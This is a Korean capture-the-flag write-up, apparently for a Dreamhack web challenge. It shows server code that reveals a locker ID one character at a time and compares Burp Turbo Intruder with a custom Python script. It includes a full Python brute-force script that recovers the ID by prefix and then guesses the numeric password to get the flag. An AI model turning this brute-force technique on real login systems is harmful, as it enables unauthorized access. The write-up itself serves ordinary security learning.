### 문제 구조

아이디(영어 소문자+숫자 4글자), 비밀번호(100~200)을 맞춰야함. 
그런데 아이디를 한 글자씩 확인할 수 있도록 되어 있음. 

``` python
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
	if locker_num == rand_str and password == str(rand_num):
		return render_template("index.html", result = "FLAG:" + FLAG)
	return render_template("index.html", result = "Good")
else:
	return render_template("index.html", result = "Wrong!")
```

### 나의 시도

처음에 코드를 제대로 읽지 않고 바로 Burp Suite의 Turbo Intruder로 브루트포스를 했다가 너무 오래 걸려서 코드를 읽고 한 글자씩 찾는 방식으로 함. 

### 새로운 개념

이렇게 서버 응답에 따라서 다음 공격을 단계를 자동으로 결정하는 경우에는 Python으로 스크립트를 직접 작성하는 것이 나음. 

| 비교 항목      | Turbo Intruder               | Python 직접 작성          |
| ---------- | ---------------------------- | --------------------- |
| 실행 환경      | Burp Suite 확장 프로그램           | 독립 실행 프로그램            |
| HTTP 요청 처리 | 최적화된 자체 HTTP 엔진              | requests, httpx 등     |
| 요청 속도      | 대량 요청에 최적화                   | 라이브러리 및 동시성 구현에 따라 다름 |
| HTTP 패킷 확인 | Burp에서 바로 확인 가능              | 직접 출력·로깅 구현           |
| 복잡한 공격 로직  | 가능하지만 도구 API에 의존             | 자유롭게 구현 가능            |
| 적합한 용도     | 대량 퍼징, 고속 요청, Race Condition | 단계별 공격, 상태 관리, 조건부 요청 |

``` python

import requests
import string

url = "http://host3.dreamhack.games:9020/"
chars = string.ascii_lowercase + string.digits

session = requests.Session()
locker_num = ""

# 사물함 번호를 앞에서부터 한 글자씩 탐색
for _ in range(4):
    for char in chars:
        candidate = locker_num + char

        response = session.post(
            url,
            data={"locker_num": candidate, "password": ""},
            timeout=5
        )

        if "Good" in response.text:
            locker_num = candidate
            print("현재까지 찾은 번호:", locker_num)
            break

# 비밀번호 탐색
for password in range(100, 201):
    response = session.post(
        url,
        data={"locker_num": locker_num, "password": str(password)},
        timeout=5
    )

    if "FLAG:" in response.text:
        print("비밀번호:", password)
        print(response.text)
        break

```
- `requests.post()`: HTTP POST 요청을 보내는 기본 문법
- `requests.Session()`: 쿠키가 요청 사이에 유지 됨. 같은 서버에 대한 TCP 연결도 재사용 가능


